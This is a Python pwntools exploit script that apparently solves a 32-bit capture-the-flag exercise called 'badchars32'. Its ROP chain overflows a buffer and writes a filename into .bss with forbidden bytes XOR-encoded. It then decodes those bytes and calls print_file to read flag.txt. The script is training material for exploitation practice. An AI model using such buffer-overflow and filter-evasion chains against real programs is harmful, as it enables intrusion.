from pwn import *

exe = ELF("./badchars32", checksec=False)
p = process(exe.path)

pop_esi_edi_ebp = 0x080485b9
mov_edi_esi = 0x0804854f
pop_ebx = 0x0804839d
xor_ebp_bl = 0x08048547
bss_addr = exe.bss()
file = b"flag.txt"

# 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
# 0x0804854f : mov dword ptr [edi], esi ; ret
# 0x0804839d : pop ebx ; ret
# 0x08048547 : xor byte ptr [ebp], bl ; ret

def xorString(s, badchars, key):
    idx = []

    s_xor = ""
    for i, c in enumerate(s):
        if chr(c) in badchars:
            idx.append(i)
            s_xor += chr(c ^ key)
        else:
            s_xor += chr(c)

    print(s_xor.encode('latin'))

    return bytes(s_xor.encode('latin')), idx

badchars = ['x', 'g', 'a', '.']

file_xor1, idx1 = xorString(b"flag", badchars, 0x2)
file_xor2, idx2 = xorString(b".txt", badchars, 0x2)

payload = b'A' * 44

payload += p32(pop_esi_edi_ebp)
payload += file_xor1
payload += p32(bss_addr)
payload += p32(0xdeadbeef)
payload += p32(mov_edi_esi)

payload += p32(pop_esi_edi_ebp)
payload += file_xor2
payload += p32(bss_addr + 4)
payload += p32(0xdeadbeef)
payload += p32(mov_edi_esi)

for i in idx1:
    payload += p32(pop_esi_edi_ebp)
    payload += p32(0xdeadbeef)
    payload += p32(0xdeadbeef)
    payload += p32(bss_addr + i)
    payload += p32(pop_ebx)
    payload += p32(0x2)
    payload += p32(xor_ebp_bl)

for i in idx2:
    payload += p32(pop_esi_edi_ebp)
    payload += p32(0xdeadbeef)
    payload += p32(0xdeadbeef)
    payload += p32(bss_addr + i + 4)
    payload += p32(pop_ebx)
    payload += p32(0x2)
    payload += p32(xor_ebp_bl)

payload += p32(exe.symbols['print_file'])
payload += p32(0xdeadbeef)
payload += p32(bss_addr)

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)